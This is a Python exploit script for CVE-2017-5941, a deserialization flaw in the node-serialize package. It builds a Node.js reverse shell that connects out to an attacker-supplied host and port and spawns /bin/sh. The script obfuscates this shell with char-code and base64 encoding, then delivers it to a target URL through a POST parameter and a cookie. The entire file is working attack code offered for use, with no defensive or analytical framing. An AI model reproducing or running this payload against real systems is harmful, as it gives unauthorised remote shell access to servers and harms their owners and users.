#!/usr/bin/python3
# Using the evilpacket revshell
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Exploit for CVE-2017-5941

import sys
import requests
import base64
import time
from requests.structures import CaseInsensitiveDict

#if argvs are different from 3, exit the program
if len(sys.argv) != 3:
	print(f"Usage: "+sys.argv[0]+" <lhost> <lport>")
	sys.exit(0)
print('<'+9*'- - - '+'>')
print('Don\'t forget to set up a listener on your port!\n')

#defining argvs and url
lhost = sys.argv[1]
lport = sys.argv[2]
url = input('Enter the target URL: ')

#crafting the payload
node_shell = str(f'''var net = require('net');
var spawn = require('child_process').spawn;
HOST="{sys.argv[1]}";
PORT="{sys.argv[2]}";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') {{ String.prototype.contains = function(it) {{ return this.indexOf(it) != -1; }}; }}
function c(HOST,PORT) {{
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {{
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){{
          client.end("Disconnected!\\n");
        }});
    }});
    client.on('error', function(e) {{
        setTimeout(c(HOST,PORT), TIMEOUT);
    }});
}}
c(HOST,PORT);''')

#decimal encoding of the payload
enc = [ord(char) for char in node_shell]
enc1 = ",".join(str(value) for value in enc)
RCE = str(f'''eval(String.fromCharCode({enc1}))''')
cmd =  str(f'''{{"rce":"_$$ND_FUNC$$_function (){{{RCE}}}()"}}''')

#base64 encoding
b1 = cmd.encode("ascii")
b2 = base64.b64encode(b1)
b3 = b2.decode("ascii")

#making the http request
headers = CaseInsensitiveDict()
parameter = input('Enter the parameter: ')
cookie = input('Enter the cookie that will be unserialized: ')
headers["Cookie"] = str(f"{cookie}={b3}")

#post-request
postdata = str(f'{parameter}={b3}')
postreq = requests.post(url,postdata)
print('Sending the payload...\n')
print(postreq)

if postreq.ok:
	print('Payload ready!\n')
else:
	print('Post failed!\n')
	#sys.exit(0) - continue if a cookie is already in place
	print('Trying to exploit without the post request...')

#timeout five seconds
time.sleep(5)

#get-request
getreq = requests.get(url,headers=headers)

if getreq.ok:
	print('Executing the payload...\n')
	print(getreq)
	print('You got a shell, check your listener!')
else:
	print("Get failed!\n")
	print("The target could not be exploited.")
	sys.exit(0)
